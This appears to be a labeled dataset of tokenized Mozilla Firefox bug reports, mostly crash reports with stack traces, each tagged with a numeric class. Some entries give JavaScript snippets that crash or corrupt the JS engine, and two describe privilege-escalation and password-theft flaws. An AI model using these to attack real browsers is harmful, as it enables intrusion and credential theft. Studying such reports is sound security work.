crash isbindingancestor with frameset iframe ib assertion reflow roots should never split status ns_frame_complete file users/jruderman/central/layout/base/nspresshell.cpp line 6347 assertion frame not in line line contains adeletedframe file users/jruderman/central/layout/generic/nsblockframe.cpp line 5385 crash isbindingancestor trying to access memory at	11
crash with iexploder test 2203 nscomputeddomstyle getwidth crash with iexploder test 2203 nscomputeddomstyle getwidth bp-4c74fadc-f5ec-448a-8431-90d0e2090210 nscomputeddomstyle getwidth layout/style/nscomputeddomstyle.cpp:2888 nscomputeddomstyle getpropertycssvalue layout/style/nscomputeddomstyle.cpp:366 nscomputeddomstyle getpropertyvalue layout/style/nscomputeddomstyle.cpp:300 nscomputeddomstyle getpropertyvalue layout/style/nscomputeddomstyle.cpp:244 css2propertiestearoff getwidth layout/style/nscssproplist.h:543 ns_invokebyindex_p xpcom/reflect/xptcall/src/md/unix/xptcinvoke_unixish_x86.cpp:179 xpcwrappednative callmethod js/src/xpconnect/src/xpcwrappednative.cpp:2424 xpc_wn_gettersetter js/src/xpconnect/src/xpcprivate.h:2298 js_invoke js/src/jsinterp.cpp:1316 js_internalinvoke js/src/jsinterp.cpp:1392 js_callfunctionvalue js/src/jsapi.cpp:5299 xpcwrapper getorsetnativeproperty js/src/xpconnect/src/xpcwrapper.cpp:717 xpc_nw_getorsetproperty js/src/xpconnect/src/xpcnativewrapper.cpp:597 js_nativeget js/src/jsobj.cpp:3853 js_getpropertyhelper js/src/jsobj.cpp:4023 js_interpret js/src/jsinterp.cpp:4297 js_invoke js/src/jsinterp.cpp:1334 nsxpcwrappedjsclass callmethod js/src/xpconnect/src/xpcwrappedjsclass.cpp:1606 nsxpcwrappedjs callmethod js/src/xpconnect/src/xpcwrappedjs.cpp:561 prepareanddispatch xpcom/reflect/xptcall/src/md/unix/xptcstubs_unixish_x86.cpp:93 prepareanddispatch nseventlistenermanager handleeventsubtype content/events/src/nseventlistenermanager.cpp:1079 nseventlistenermanager handleevent content/events/src/nseventlistenermanager.cpp:1176 nseventtargetchainitem handleevent content/events/src/nseventdispatcher.cpp:227 nseventtargetchainitem handleeventtargetchain content/events/src/nseventdispatcher.cpp:291 nseventdispatcher dispatch content/events/src/nseventdispatcher.cpp:508 documentviewerimpl loadcomplete layout/base/nsdocumentviewer.cpp:997 nsdocshell endpageload docshell/base/nsdocshell.cpp:5243 nswebshell endpageload docshell/base/nswebshell.cpp:1015 nsdocshell onstatechange docshell/base/nsdocshell.cpp:5139 nsdocloader fireonstatechange uriloader/base/nsdocloader.cpp:1235 nsdocloader dostopdocumentload uriloader/base/nsdocloader.cpp:858 nsdocloader docloaderisempty uriloader/base/nsdocloader.cpp:763 nsdocloader onstoprequest uriloader/base/nsdocloader.cpp:679 nsloadgroup removerequest netwerk/base/src/nsloadgroup.cpp:688 nsdocument dounblockonload content/base/src/nsdocument.cpp:7080 nsdocument dispatchcontentloadedevents content/base/src/nsdocument.cpp:3983 nsrunnablemethod nsdocument run nsthreadutils.h:264 nsthread processnextevent xpcom/threads/nsthread.cpp:510 ns_processpendingevents_p nsthreadutils.cpp:180 nsbaseappshell nativeeventcallback widget/src/xpwidgets/nsbaseappshell.cpp:121 nsappshell processgeckoevents widget/src/cocoa/nsappshell.mm:381 corefoundation corefoundation hitoolbox hitoolbox hitoolbox appkit appkit appkit nsappshell run widget/src/cocoa/nsappshell.mm:700 nsappstartup run toolkit/components/startup/src/nsappstartup.cpp:192 xre_main toolkit/xre/nsapprunner.cpp:3216 main browser/app/nsbrowserapp.cpp:156	11
xslt stylesheet compiler crashes i do n't have external url for testcase yet but any firefox 3.0 browser crashes on some specific testcase xslt/msft_conformance_tests/attributesets/xslt_attributeset_importsamename.html 0 in dl_sysinfo_int80 from lib/ld-linux.so.2 1 in raise from lib/i686/cmov/libpthread.so.0 2 in nsprofilelock fatalsignalhandler signo=11 at nsprofilelock.cpp:212 3 signal handler called 4 in 5 in txstylesheet addattributeset this aattributesetitem at dist/include/xpcom/nsautoptr.h:71 6 in txstylesheet donecompiling this at mozilla/content/xslt/src/xslt/txstylesheet.cpp:330 7 in txstylesheetcompiler maybedonecompiling this at mozilla/content/xslt/src/xslt/txstylesheetcompiler.cpp:552 8 in tx_compilestylesheet anode aprocessor acallerprincipal astylesheet at mozilla/content/xslt/src/xslt/txmozillastylesheetcompiler.cpp:809 9 in txmozillaxsltprocessor importstylesheet this astyle at mozilla/content/xslt/src/xslt/txmozillaxsltprocessor.cpp:618 10 in ns_invokebyindex_p from obj-i386-nolibxul-buildmicrob2/dist/bin/libxpcom_core.so 11 in xpcwrappednative callmethod ccx mode=xpcwrappednative call_method at mozilla/js/src/xpconnect/src/xpcwrappednative.cpp:2424 12 in xpc_wn_callmethod cx obj argc=1 argv vp type return to continue or q return to quit at mozilla/js/src/xpconnect/src/xpcwrappednativejsops.cpp:1587 13 in js_invoke cx argc=1 vp flags=2 at mozilla/js/src/jsinterp.cpp:1312 14 in js_interpret cx at mozilla/js/src/jsinterp.cpp:5020 15 in js_execute cx chain script down flags=0 result at mozilla/js/src/jsinterp.cpp:1561 16 in js_evaluateucscriptforprincipals cx obj principals chars length=44 filename lineno=395 rval at mozilla/js/src/jsapi.cpp:5239 17 in nsjscontext evaluatestring this ascript ascopeobject aprincipal aurl alineno=395 aversion=0 aretvalue aisundefined at mozilla/dom/src/base/nsjsenvironment.cpp:1596 18 in nsglobalwindow runtimeout this atimeout at mozilla/dom/src/base/nsglobalwindow.cpp:7736 19 in nsglobalwindow timercallback atimer aclosure at mozilla/dom/src/base/nsglobalwindow.cpp:8087 20 in nstimerimpl fire this at mozilla/xpcom/threads/nstimerimpl.cpp:428 21 in nstimerevent run this at mozilla/xpcom/threads/nstimerimpl.cpp:520 22 in nsthread processnextevent this maywait=0 result type return to continue or q return to quit at mozilla/xpcom/threads/nsthread.cpp:510 23 in ns_processpendingevents_p thread timeout=20 at nsthreadutils.cpp:180 24 in nsbaseappshell nativeeventcallback this at mozilla/widget/src/xpwidgets/nsbaseappshell.cpp:121 25 in nsappshell eventprocessorcallback source condition=g_io_in data at mozilla/widget/src/gtk2/nsappshell.cpp:69 26 in from usr/lib/libglib-2.0.so.0	11
js1_6/extensions/regress-456826.js math|date is not defined from bug 456826 comment 36 js1_6/extensions/regress-456826.js:93 math is not defined js1_6/extensions/regress-456826.js:127 date is not defined either of these errors may occur depending on the build and shell options this regressed in igor mir2.org date wed apr 02 00:46:12 2008 0700 summary bug 423874 allocating functions together with jsobject r=brendan	11
js_checkredeclaration does not always unlock object on failures the contract for js_checkredeclaration is to always call obj_drop_property on failures but this does not happen when the caller passes non-null objp/propp for objects shared between threads this leads to unbalanced js lock/unlock object the example below demonstrates this currently it hangs when run in a thread-safe shell note this probably is not reproducible in the browser as even with thread workers no objects should be shared between threads function x return 1 g must run sufficiently long to ensure that the global scope is accessed from the parallel threads function g var sum 0 try for var i 0 i 10000 i sum x catch e scatter g g try eval const x 1 catch e scatter g g print done	11
xpcnativewrapper s tostring s proto comes from the wrong scope this is a similar problem to bug 370127 if chrome code calls content.tostring.call then content-defined functions can be called by chrome code also it s possible to use this bug to bypass xow and perform bug 369334 s xss attack	2
fix it s possible to create a document whose uri does not match the document s principal this seems to be a regression from bug 445004 fx3.0.7 and fx3.1 are affected on trunk this seems to have been fixed by bug 465806 in nshtmldocument opencommon we get the uri from the document returned by getdocumentfromcontext but we get the principal by using getsubjectprincipal an attacker can create a fake login page whose uri is a real login page s uri and if a password for the real login page was already saved in the password manager an attacker can steal the password without user interaction	2
crash nseventstatemanager getcontentstate nsnativetheme checkbooleanattr with moz-appearance and position fixed loading the testcase in firefox trunk on mac opt or debug makes it crash	9
crash ispercentageaware with first-letter rtl loading the testcase triggers assertion unexpected flow mframes.containsframe nextinflow file users/jruderman/trunk/mozilla/layout/generic/nsinlineframe.cpp line 469 assertion stealframe failure ns_succeeded rv file users/jruderman/trunk/mozilla/layout/generic/nscontainerframe.cpp line 1116 crash ispercentageaware security-sensitive because the testcase is very similar to the testcase for bug 429968	9
crash nshtmleditor hideresizers with non-html root changing contenteditable property a lot loading the testcase makes firefox crash nshtmleditor hideresizers the immediate cause of the crash is that mtoplefthandle is null	9
crash nslistboxbodyframe getnextitembox with xul listbox xbl loading the testcase makes firefox crash nslistboxbodyframe getnextitembox	9
xulrunner crashes when fails to find the window on which to change the cursor user-agent mozilla/5.0 x11 u linux i686 en-us rv:1.9.0.1 gecko/2008072820 firefox/3.0.1 build identifier in 923 914 ns_imethodimp 915 nswindow setcursor nscursor acursor 916 917 if we re not the toplevel window pass up the cursor request to 918 the toplevel window to handle it 919 if mcontainer mdrawingarea 920 gtkwidget widget 921 get_gtk_widget_for_gdk_window mdrawingarea inner_window 922 nswindow window get_window_for_gtk_widget widget 923 return window setcursor acursor 924 get_window_for_gtk_widget can return null in some circumstances we should guard against this with something similar to this from nswindow setmodal prbool amodal 547 if parent 548 return ns_error_failure reproducible could n't reproduce an user of sugar has reported it but i could n't reproduce it	9
crash unhooktextrunfromframes clearalltextrunreferences with bidi steps to reproduce 1 load the testcase 2 quit firefox result crash unhooktextrunfromframes or clearalltextrunreferences if mallocscribble is enabled the crash involves dereferencing 5555567d but without mallocscribble a random address gets called	9
crash nshtmliframeelement queryinterface i have an unminimized testcase that crashes with this stacktrace unfortunately it does crash not regurlarly it can take up to 5 minutes to crash which makes it really difficult to make a minimized testcase so i m giving up for now i ve attached an zipped up unminimized testcase open the parentframe.htm file to test you might be more lucky to get the crash to open that file in multiple tabs it also crashes firefox 3 so marking security sensitive for now 0 ntdll.dll kifastsystemcallret 1 ntdll.dll ntreleasesemaphore 2 kernel32.dll releasesemaphore 3 xul.dll google_breakpad exceptionhandler writeminidumponhandlerthread toolkit/crashreporter/google-breakpad/src/client/windows/handler/exception_handler.cc:562 4 xul.dll xul.dll 5 mozcrt19.dll purecall obj-firefox/memory/jemalloc/src/purevirt.c:47 6 xul.dll nsgenericelement queryinterface content/base/src/nsgenericelement.cpp:4122 7 xul.dll xul.dll 8 xul.dll nshtmliframeelement queryinterface content/html/content/src/nshtmliframeelement.cpp:120 9 xul.dll nscomptr_base assign_from_qi obj-firefox/xpcom/build/nscomptr.cpp:96 10 xul.dll nscomptr nsicontent nscomptr nsicontent obj-firefox/dist/include/xpcom/nscomptr.h:572 11 xul.dll nsglobalwindow posthandleevent dom/base/nsglobalwindow.cpp:2350 12 xul.dll nseventtargetchainitem handleeventtargetchain content/events/src/nseventdispatcher.cpp:294 13 xul.dll nseventtargetchainitem handleeventtargetchain content/events/src/nseventdispatcher.cpp:345 14 xul.dll nseventdispatcher dispatch content/events/src/nseventdispatcher.cpp:508 15 xul.dll documentviewerimpl loadcomplete layout/base/nsdocumentviewer.cpp:1001 16 xul.dll nsdocshell endpageload docshell/base/nsdocshell.cpp:5263 17 xul.dll nswebshell endpageload docshell/base/nswebshell.cpp:1302 18 xul.dll nscomptr_base assign_from_qi obj-firefox/xpcom/build/nscomptr.cpp:98 19 xul.dll nsdocshell onstatechange docshell/base/nsdocshell.cpp:5159 firefox 3.0.7 breakpad id	9
atom table crash triggered by dom mutation events and unicode surrogates this bug was initially created as a clone of bug 395651 created an attachment id=280323 testcase causes shutdown crash this still crashes 1.9.0 on shutdown on mac and windows at least security sensitive since the original was sg critical and exploitable says probably exploitable data from faulting address controls code flow starting at xpcom_core atomtableclearentry 0 in 1 in atomtableclearentry table entry at work/mozilla/builds/1.9.0/mozilla/xpcom/ds/nsatomtable.cpp:325 2 in pl_dhashtablefinish table at pldhash.c:373 3 in ns_purgeatomtable at work/mozilla/builds/1.9.0/mozilla/xpcom/ds/nsatomtable.cpp:414 4 in ns_shutdownxpcom_p servmgr at work/mozilla/builds/1.9.0/mozilla/xpcom/build/nsxpcominit.cpp:841 5 in scopedxpcomstartup scopedxpcomstartup this at work/mozilla/builds/1.9.0/mozilla/toolkit/xre/nsapprunner.cpp:931 6 in scopedxpcomstartup scopedxpcomstartup this at work/mozilla/builds/1.9.0/mozilla/toolkit/xre/nsapprunner.cpp:934 7 in xre_main argc=4 argv aappdata at work/mozilla/builds/1.9.0/mozilla/toolkit/xre/nsapprunner.cpp:3237 8 in main argc=4 argv at work/mozilla/builds/1.9.0/mozilla/browser/app/nsbrowserapp.cpp:158	9
another crash on testcase from 489647 with accessibility enabled in nstextframe cleartextrun mozilla/5.0 x11 u linux i686 en-us rv:1.9.0.10 gecko/2009042315 firefox/3.0.10 seems i can still make firefox 3.0.10 crash by enabling accessibility in gnome on ubuntu jaunty like 1 gconftool-2 set type=bool desktop/gnome/interface/accessibility true 2 firefox sample crash	9
crash nsviewmanager dispatchevent downstream bug in nsviewmanager dispatchevent there s a code 1130 vm dosetwindowdimensions vm mdelayedresize.width 1131 vm mdelayedresize.height 1132 vm mdelayedresize.sizeto nscoord_none nscoord_none 1133 1134 paint later 1135 vm updateview vm mrootview ns_vmrefresh_no_sync but vm nsviewmanager can be destroyed in dosetwindowdimensions so vm updateview vm mrootview ns_vmrefresh_no_sync uses already freed object vm is a normal pointer here in this particular case viewmanager is destroyed because of frame style change 0 documentviewerimpl hide this at nsdocumentviewer.cpp:1997 1 in nsdocshell setvisibility this avisibility=0 at nsdocshell.cpp:3970 2 in nssubdocumentframe destroy this at nsframeframe.cpp:775 3 in nsblockframe doremoveframe this adeletedframe adestroyframes=1 aremoveonlyfluidcontinuations=0 at nsblockframe.cpp:5415 4 in nsblockframe removeframe this alistname aoldframe at nsblockframe.cpp:5013 5 in nsframemanager removeframe this aparentframe alistname aoldframe at nsframemanager.cpp:694 6 in nscssframeconstructor contentremoved this acontainer achild aindexincontainer=0 adidreconstruct at nscssframeconstructor.cpp:9644 7 in nscssframeconstructor recreateframesforcontent this acontent at nscssframeconstructor.cpp:11278 8 in nscssframeconstructor processrestyledframes this achangelist at nscssframeconstructor.cpp:10018 9 in nscssframeconstructor restyleelement this acontent aprimaryframe aminhint=0 at nscssframeconstructor.cpp:10087 10 in nscssframeconstructor processonerestyle this acontent arestylehint=erestyle_self achangehint=0 at nscssframeconstructor.cpp:13422 11 in nscssframeconstructor processpendingrestyles this at nscssframeconstructor.cpp:13518 12 in presshell doflushpendingnotifications this atype=flush_layout ainterruptiblereflow=1 at nspresshell.cpp:4540 13 in presshell willpaint this at nspresshell.cpp:6005 14 in nsviewmanager flushpendinginvalidates this at nsviewmanager.cpp:2285 15 in nsviewmanager enablerefresh this aupdateflags=0 at nsviewmanager.cpp:1998 16 in nsviewmanager endupdateviewbatch this aupdateflags=0 at nsviewmanager.cpp:2041 17 in nsiviewmanager updateviewbatch endupdateviewbatch this aupdateflags=0 at dist/include/view/nsiviewmanager.h:379 18 in presshell resizereflow this awidth=18000 aheight=28080 at nspresshell.cpp:2579 19 in presshell resizereflow this aview awidth=18000 aheight=28080 at nspresshell.cpp:5977 20 in nsviewmanager dosetwindowdimensions this awidth=18000 aheight=28080 at nsviewmanager.h:325 21 in nsviewmanager dispatchevent this aevent astatus at nsviewmanager.cpp:1131 22 in handleevent aevent at nsview.cpp:168 23 in nscommonwidget dispatchevent this aevent astatus at nscommonwidget.cpp:158 24 in nswindow onexposeevent this awidget aevent at nswindow.cpp:1776 gdb f 0 0 documentviewerimpl hide this at nsdocumentviewer.cpp:1997 1997 getdocumentselection getter_addrefs selection gdb p mviewmanager 8 mrawptr gdb f 21 21 in nsviewmanager dispatchevent this aevent astatus at nsviewmanager.cpp:1131 gdb p vm 6 nsviewmanager	9
shutdown crash pl_dhashtablefinish with high surrogate in style this bug was initially created as a clone of bug 439206 created an attachment id=325076 testcase makes firefox crash on shutdown this bug is marked fixed on 1.9.0 but it still crashes for me on winxp with dom/base/crashtests/439206-1.html from trunk 1.9.0 exploitable report probably_exploitable probably exploitable data from faulting address controls code flow starting at xpcom_core atomtableclearentry	9
assertion failure map depth 0 in js_leavesharpobject pasting the following into the js shell causes an assertion failure q q.__definegetter 0 q.tostring q 2 q q.tosource in opt i get internalerror too much recursion instead	9
crash parsexmlsource jsxml.c:1978 i m running nightly of firefox wit jesse s js fuzzer and firefox is repeatably crashing in parsexmlsource i m running fuzzer in browser so i ca n't provide exact crashing testcase but firefox crash every time in few minutes used js fuzzer version in html wrapper signature parsexmlsource uuid 311476e1-00b4-11dd-b302-001a4bd43ef6 time 2008-04-02 05:56:09-07:00 uptime 1692 product firefox version 3.0pre build id 2008040112 os windows nt os version 5.1.2600 service pack 2 cpu x86 cpu info genuineintel family 6 model 14 stepping 8 crash reason exception_access_violation crash address some reports	9
assertion failure obj_scope pobj object pobj with proto definesetter pasting the following script into a debug js shell triggers assertion failure obj_scope pobj object pobj at jsinterp.c:370 function boom var b array.__proto b b.__proto var c c.__proto try c.__definesetter t undefined catch e c.__proto array try c.__definesetter v undefined catch e boom	9
js_fillpropertycache is called with garbage-collected pobj the current code when calls js_fillpropertycache for properties found on prototype chains does not detect that a setter or getter could have deleted the prototype and gc-ed it this would cause js_fillpropertycache to access gc-ed objects here is an example that demonstrates this watson~/m/tm/js/src cat s/x1.js var obj proto get a this.__proto null gc return 0 obj.a watson~/m/tm/js/src build/js32.tm.dbg/js s/x1.js before 20480 after 20480 break 08262000 segmentation fault this bug exists on 1.9 branches and may or may not be related to the bug 484042	9
assertion setmayhaveframe failed and crash nscssframeconstructor createfloatingletterframe with arabic floating first-letter loading the testcase triggers assertion setmayhaveframe failed mcontent mayhaveframe file users/jruderman/trunk/mozilla/layout/generic/nsframe.cpp line 409 followed by a null deref nscssframeconstructor createfloatingletterframe	11
crash nsframemanager getprimaryframefor with mathml domattrmodified doing stuff see testcase which crashes current trunk build after 200ms it also crashes firefox 3 this regressed between 2008-01-29 and 2008-01-30 i think a regression from bug 391002 somehow stack trace from debug build gklayout.dll nsframemanager getprimaryframefor nsicontent acontent int aindexhint=2 line 377 bytes c gklayout.dll nscssframeconstructor contentremoved nsicontent acontainer nsicontent achild int aindexincontainer=2 int adidreconstruct line 9485 bytes c gklayout.dll presshell contentremoved nsidocument adocument nsicontent acontainer nsicontent achild int aindexincontainer=2 line 4766 c gklayout.dll nsnodeutils contentremoved nsinode acontainer nsicontent achild int aindexincontainer=2 line 167 bytes c gklayout.dll nsgenericelement doremovechildat unsigned int aindex=2 int anotify=1 nsicontent akid nsicontent aparent nsidocument adocument nsattrandchildarray achildarray line 2846 bytes c gklayout.dll nsgenericelement removechildat unsigned int aindex=2 int anotify=1 line 2776 bytes c gklayout.dll nsxulelement removechildat unsigned int aindex=2 int anotify=1 line 1029 bytes c gklayout.dll nsgenericelement doremovechild nsidomnode aoldchild nsicontent aparent nsidocument adocument nsidomnode areturn line 3438 bytes c gklayout.dll nsgenericelement removechild nsidomnode aoldchild nsidomnode areturn line 3004 bytes c gklayout.dll nsxulelement removechild nsidomnode oldchild nsidomnode retval line 614 bytes c xpcom_core.dll ns_invokebyindex_p nsisupports that unsigned int methodindex=2 unsigned int paramcount=1239832 nsxptcvariant params line 102 c xpc3250.dll xpcwrappednative callmethod xpccallcontext ccx xpcwrappednative callmode mode=17 line 2393 bytes c xpc3250.dll xpcwrappednative callmethod xpccallcontext ccx xpcwrappednative callmode mode=call_method line 2393 bytes c xpc3250.dll xpc_wn_callmethod jscontext cx jsobject obj unsigned int argc=1 long argv long vp line 1473 bytes c js3250.dll js_invoke jscontext cx unsigned int argc=1 long vp unsigned int flags=2 line 1297 bytes c js3250.dll js_interpret jscontext cx line 4852 bytes c js3250.dll js_invoke jscontext cx unsigned int argc=1 long vp unsigned int flags=0 line 1313 bytes c js3250.dll js_internalinvoke jscontext cx jsobject obj long fval=36766528 unsigned int flags=0 unsigned int argc=1 long argv long rval line 1369 bytes c js3250.dll js_callfunctionvalue jscontext cx jsobject obj long fval=36766528 unsigned int argc=1 long argv long rval line 5054 bytes c gklayout.dll nsjscontext calleventhandler nsisupports atarget void ascope void ahandler nsiarray aargv nsivariant arv line 1962 bytes c gklayout.dll nsglobalwindow runtimeout nstimeout atimeout line 7897 bytes c gklayout.dll nsglobalwindow timercallback nsitimer atimer void aclosure line 8231 c xpcom_core.dll nstimerimpl fire line 400 bytes c xpcom_core.dll nstimerevent run line 492 c xpcom_core.dll nsthread processnextevent int maywait=1 int result line 511 c xpcom_core.dll ns_processnextevent_p nsithread thread int maywait=1 line 227 bytes c gkwidget.dll nsbaseappshell run line 170 bytes c tkitcmps.dll nsappstartup run line 181 bytes c xul.dll xre_main int argc=1 char argv const nsxreappdata aappdata line 3170 bytes c firefox.exe ns_internal_main int argc=1 char argv line 158 bytes c firefox.exe wmain int argc=1 unsigned short argv line 87 bytes c firefox.exe tmaincrtstartup line 583 bytes c firefox.exe wmaincrtstartup line 403 c kernel32.dll baseprocessstart 4 bytes	11
crash nscontentutils compareposition nsinode nsinode with multipe identic ids splitted from bug 442227 comment 8	11
set aside the frame chain when firing synchronous events this is a spin-off of bug 461743 comment 0 when we fire synchronous events we do n't set aside the frame chain so security checks will find any chrome code running as a result of settimeout even if the code is properly using xpc wrappers it seems to me that we should always set aside the frame pointer when pushing a context onto the context stack	11
crash getlastspecialsibling with moz-column fieldset select this testcase causes getlastspecialsibling to call 0 or	11
crash nscssframeconstructor constructframe with rtl floating first-letter thread 0 crashed 0 1 nscssframeconstructor constructframe nsframeconstructorstate nsicontent nsiframe nsframeitems 89 nscssframeconstructor.cpp:7379 2 nscssframeconstructor contentappended nsicontent int 2090 nscssframeconstructor.cpp:8580 3 presshell contentappended nsidocument nsicontent int 279 nspresshell.cpp:4698 4 nsnodeutils contentappended nsicontent int 324 nsnodeutils.cpp:119 5 nsgenericelement doinsertchildat nsicontent unsigned int int nsicontent nsidocument nsattrandchildarray 1669 nsgenericelement.cpp:3265 6 nsgenericelement insertchildat nsicontent unsigned int int 127 nsgenericelement.cpp:3193 7 nsgenericelement doreplaceorinsertbefore int nsidomnode nsidomnode nsicontent nsidocument nsidomnode 4185 nsgenericelement.cpp:3929 8 nsgenericelement insertbefore nsidomnode nsidomnode nsidomnode 63 nsgenericelement.cpp:3512 9 nshtmlspanelement insertbefore nsidomnode nsidomnode nsidomnode 38 nshtmlspanelement.cpp:57 10 nsgenericelement appendchild nsidomnode nsidomnode 48 nsgenericelement.h:497 11 nshtmlspanelement appendchild nsidomnode nsidomnode 31 nshtmlspanelement.cpp:57 12 nsidomnode_appendchild jscontext unsigned int long 488 dom_quickstubs.cpp:2339 13 js_interpret 93406 jsinterp.cpp:5118	11
crash nscssframeconstructor adjustparentframe with domattrmodified observes binding and focusing see testcase which crashes current trunk build within 100ms this regressed between 2008-09-11 and 2008-09-12 i think a regression from bug 454361 somehow 0 xul.dll nscssframeconstructor adjustparentframe layout/base/nscssframeconstructor.cpp:3407 1 xul.dll nscssframeconstructor constructframeinternal layout/base/nscssframeconstructor.cpp:7494 2 xul.dll nscssframeconstructor constructframe layout/base/nscssframeconstructor.cpp:7406 3 xul.dll nscssframeconstructor contentinserted layout/base/nscssframeconstructor.cpp:8997 4 xul.dll nscssframeconstructor recreateframesforcontent layout/base/nscssframeconstructor.cpp:11143 5 xul.dll nscssframeconstructor processrestyledframes layout/base/nscssframeconstructor.cpp:9868 6 xul.dll nscssframeconstructor restyleelement layout/base/nscssframeconstructor.cpp:9942 7 xul.dll nscssframeconstructor processonerestyle layout/base/nscssframeconstructor.cpp:13280 8 xul.dll nscssframeconstructor processpendingrestyles layout/base/nscssframeconstructor.cpp:13378 9 xul.dll presshell doflushpendingnotifications layout/base/nspresshell.cpp:4541 10 xul.dll presshell flushpendingnotifications layout/base/nspresshell.cpp:4505 11 xul.dll nscssframeconstructor restyleevent run layout/base/nscssframeconstructor.cpp:13451 12 xul.dll nsthread processnextevent xpcom/threads/nsthread.cpp:510 13 xul.dll nsbaseappshell run widget/src/xpwidgets/nsbaseappshell.cpp:170 14 nspr4.dll pr_getenv 15 firefox.exe wmain toolkit/xre/nswindowswmain.cpp:87 16 firefox.exe firefox.exe 17 kernel32.dll baseprocessstart	11
crash nsframe getboxascent with binding observes and domattrmodified see upcoming testcase which crashes current trunk build it also crashes firefox 3 so marking security sensitive for now it does n't crash firefox 2 i can look for a regression range if wanted 0 xul.dll nsframe getboxascent layout/generic/nsframe.cpp:6352 1 xul.dll nssprocketlayout getascent layout/xul/base/src/nssprocketlayout.cpp:1525 2 xul.dll nsstylecontext getstylevisibility layout/style/nsstylestructlist.h:103	11
assertion child list is not empty for initial reflow with first-letter rtl pre assertion child list is not empty for initial reflow mframes.isempty file users/jruderman/central/layout/generic/nsinlineframe.cpp line 324 assertion some objects allocated with allocateframe were not freed mframecount 0 file users/jruderman/central/layout/base/nspresshell.cpp line 673 these are the same assertions as in bug 429968 which was fixed recently this is probably related to bug 429969 security-sensitive because of the second assertion and the relation to those two bugs	11
nsdomofflineresourcelist uses its own unsafe way to dispatch events nsdomofflineresourcelist pushes context to stack before iterating event listeners and pops it later but it does not check if event listener killed cx or anything like that i believe this may lead to similar problems as what xhr had in bug 460002 i ll make nsdomofflineresourcelist to work like any other event target but for branches some other fix is needed	11
top crash nssubdocumentframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int user-agent mozilla/5.0 windows u windows nt 5.1 en-us rv:1.9.0.7 gecko/2009021910 firefox/3.0.7 build identifier mozilla/5.0 windows u windows nt 5.1 en-us rv:1.9.0.7 gecko/2009021910 firefox/3.0.7 source code of page doctype html public w3c//dtd xhtml 1.0 transitional//en html xmlns head title is ie8 the end of the line for internet explorer enterprise desktop randall c kennedy infoworld title meta http-equiv content-type content text/html charset=utf-8 meta name date content 2009-03-10t03:00:00-08:00 meta name description content dropping ie in favor of a newer rendering engine may be not be as easy as it seems style media all type text/css import script/css/blog.css style link rel alternate type application/rss+xml title rss href link rel edituri type application/rsd+xml title rsd href script language javascript var dcsite weblog var dczone enterprisedesktop var section weblog script script type text/javascript src script script src type text/javascript script script src type text/javascript script script language javascript src script script language javascript src script script language javascript omniture config var cattype individual var date 2009-03-10 var author='by randall c kennedy var blogname enterprise desktop randall c kennedy blogname var category microsoftmicrosoftmicrosoftmicrosoftmicrosoftmicrosoft this might not be needed var title is ie8 the end of the line for internet explorer script script language javascript src script/omniture/weblog.js script script type text/javascript s.pagename s.pagename.replace new regexp x20-\x7e g if typeof pkeys undefined if pkeys.length 0 if s.events.length 0 s.events event12 s.products pkey pkeys.join pkey do not alter anything below this line var s_code=s.t if s_code document.write s_code script script type text/javascript if navigator.appversion.indexof msie 0 document.write unescape 3c script do not remove script language javascript function omnituretrackclick modulename title obj s.prop27 lg article slot one modulename s.prop30 s.pagename if modulename article_leadgen_top s.prop28=title else s.prop29=title s.linktrackvars prop1 prop27 prop28 prop29 prop30 s.linktrackevents='none s.tl obj o title script head body div id container div id page div class header banner/other ads div style display none script language javascript type text/javascript var ord=math.random 10000000000000000 script ifw 1x1 tracking img src border 0 height 1 width 1 peel ad tile=14 script language javascript type text/javascript document.write script language javascript src ord type text/javascript script script noscript a href target blank img src width 1 height 1 border 0 alt a noscript prestitial ad tile=15 script language javascript type text/javascript document.write script language javascript src ord type text/javascript script script noscript a href target blank img src width 1 height 1 border 0 alt a noscript div end div display none div class f-left href begin ad tag 728x90 script language javascript adcalljs 728 90 leader script noscript a href target blank img src width 728 height 90 border 0 alt a noscript end ad tag div nl box div class news f-right p free newsletters p form action method get style padding:0px margin:0px div class news-form label input type checkbox class check value infoworld_todays_headlines id list name list today s headline label span style float left input type text class text name email value enter email address onfocus this.value nbsp nbsp input type submit value submit class blackvrdmed valign top style font-size 11px span input type checkbox class check name freenltp id freenltp checked nbsp nbsp label a href target blank terms of service a and a href target blank privacy policy a label div end div news-form form div end div news f-left div end div header div class header_bg login/search div class long-box a class mainlogo f-left href infoworld a div class login div end div login br form name ultraseek action accept-charset iso-8859-1 class searchbox size 16 method get div class search f-right input type text name qt id search size 25 value maxlength 1991 class text input type image src title search class button div end div search f-right form div end div long-box nav menu ul class menu id navigation li class nodrop a href class home home a li li a href news a ul li a href today s headlines a li li a href infoworld daily a li li a href special reports a li li a href newsletters a li ul li li a href test center a ul li a href latest reviews a li li a href review finder a li li a href top rated products a li li a href test center daily blog a li ul li li a href technologies a ul li a href app dev a li li a href applications a li li a href data protection a li li a href green tech a li li a href hardware a li li a href networking a li li a href mobile a li li a href open source a li li a href security a li li a href soa a li li a href storage a li li a href virtualization a li ul li li a href blogs a ul li a href cringely notes from the field a li li a href grimes security adviser a li li a href heller strategic developer a li li a href kennedy enterprise desktop a li li a href lewis advice line a li li a href mcallister fatal exception a li li a href rodrigues urlocker open sources a li li a href samson sustainable it a li li a href schwartz reality check a li li a href tynan-wood gripe line a li li a href venezia the deep end a li li a href whurley cloud computing a li li a href yager ahead of the curve a li li a href all infoworld blogs a li ul li li a href audio/video a ul li a href video a li li a href webcasts a li li a href slideshows a li li class third a href podcasts a ul li a href infoworld daily a li li a href real world soa a li li a href smb it a li li a href the storage network a li li a href virtualization report a li ul li ul li li a href events nbsp nbsp a ul li class third a href virtual conferences a ul li a href cloud computing a li li a href enterprise architecture a li li a href security directions a li li a href virtualization directions a li ul li li class third a href new economics of it a ul li a href miami fl a li li a href dallas tx a li li a href chicago il a li li a href washington dc a li li a href see all events a li ul li li a href osbc nbsp nbsp a li li a href virtualization executive forum a li li a href complete events calendar a li li a href enterprise architecture sep 08 a li li a href virtualization directions oct 08 a li li a href virtualization exec forum nov 08 a li li a href security directions dec 08 a li li a href infoworld technology summits a li li a href complete events calendar a li ul li li a href awards a ul li a href infoworld 100 a li li a href cto-25 a li li a href technology of the year a li li a href bossies a li li a href green 15 a li ul li li class nodrop a href newsletters a li li a href resources a ul li a href it resource guides a li li a href spotlights a li li a href webcasts a li li a href white papers a li li a href windows sentinel a li ul li li class nodrop a href it jobs a li li class last nodrop a href rss a li ul div end div header-bg div class content left column div class left-box f-left div class lhc_items more entries div div 